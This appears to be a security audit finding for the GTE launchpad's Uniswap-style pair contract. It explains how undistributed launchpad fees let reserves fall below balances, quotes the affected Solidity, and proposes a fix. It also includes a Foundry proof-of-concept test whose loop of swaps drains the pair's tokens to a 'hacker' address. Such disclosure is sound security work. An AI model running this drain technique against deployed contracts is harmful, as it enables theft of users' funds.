  "user_handle": "BowTiedOriole",
  "body": "# Finding description and impact\n\nWithin `GTELaunchpadV2Pair._update()`, if `timeElapsed == 0`, totalLaunchpadFees will be subtracted from reserves but the tokens will not actually be removed from the contract.\n\n[GTELaunchpadV2Pair#L134-150](https://github.com/code-423n4/2025-08-gte-perps/blob/main/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol#L134-L150)\n```solidity\nif (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n    // * never overflows, and + overflow is desired\n    price0CumulativeLast += uint256(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n    price1CumulativeLast += uint256(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n\n    if (launchpadFeeDistributor > address(0)) {\n        if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {\n            delete accruedLaunchpadFee0;\n            delete accruedLaunchpadFee1;\n            _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);\n        }\n    }\n} else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {\n    accruedLaunchpadFee0 = totalLaunchpadFee0;\n    accruedLaunchpadFee1 = totalLaunchpadFee1;\n    emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);\n}\n\n// Balances contain both accrued and new launchpad fees earned this tx\n// as balance is called before any fee distributions, so subtract the total\nreserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0;\nreserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1;\n```\n\nAs you can see above, `_distributeLaunchpadFees()` is only called if `timeElapsed > 0`. This results in a state where `balance0 > reserve0` and/or `balance1 > reserve1`.\n\nThis results in a critical vulnerability in both the mint and swap functions where `amountIn` is calculated as `balance.sub(reserve)`.\n\n```solidity\nuint256 amount0 = balance0.sub(_reserve0);\nuint256 amount1 = balance1.sub(_reserve1);\n```\n\n```solidity\nuint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\nuint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n```\n\nAfter accruing some launchpad fees, a malicious user could repeatedly call mint or swap and be credited with an amount that they did not send to the contract. This is most easily seen via swap in the POC below.\n\n# Recommended mitigation steps\n\nEither always distribute launchpad fees or adjust the amountIn calculations to account for the `accruedLaunchpadFees`.",
  "proof_of_concept": "# POC\n\nAdd the following test to `LaunchpadFeePairTest`\n\n```solidity\nfunction test_DrainTokenAfterAccruingLaunchpadFees() public {\n    uint256 amountIn = 10 ether;\n    deal(address(base), address(this), amountIn);\n\n    uint256 expectedFee = _calculateExpectedLaunchpadFee(amountIn, address(base));\n    (uint256 amount0Out, uint256 amount1Out) = getAmountsOut(pair, amountIn, address(base));\n\n    base.transfer(address(pair), amountIn);\n    pair.swap(amount0Out, amount1Out, address(this), hex\"\");\n\n    assertEq(pair.accruedLaunchpadFee0(), expectedFee, \"Fee should match exact calculation\");\n    assertEq(expectedFee, amountIn / 1000, \"invalid fee amount\");\n    \n    // At this point, baseReserves = 109.99 ether & baseBalance = 110 ether\n    assertEq(base.balanceOf(address(pair)), 110 ether);\n    (uint112 reserve0, ,) = pair.getReserves();\n    assertEq(reserve0, 109.99 ether);\n\n    // Any user can continually call swap with the difference between baseBalance and reserve0 to drain the contract\n    address hacker = makeAddr(\"hacker\");\n    console.log(\"hacker balance pre: \", base.balanceOf(hacker));\n    vm.startPrank(hacker);\n\n    for (uint256 i = 0; i < 1000; i++) {\n        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();\n        uint256 difference = (base.balanceOf(address(pair)) - reserve0) * 997 / 1000;\n\n        pair.swap(difference, 0, hacker, hex\"\");\n    }\n    console.log(\"hacker balance post: \", base.balanceOf(hacker));\n}\n```",
